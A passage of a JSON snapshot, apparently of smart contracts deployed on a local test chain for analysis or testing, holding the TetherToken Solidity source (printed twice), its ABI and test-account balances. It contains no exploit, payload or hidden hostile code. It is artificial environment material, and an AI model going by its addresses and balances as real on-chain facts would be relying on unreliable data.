_allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": 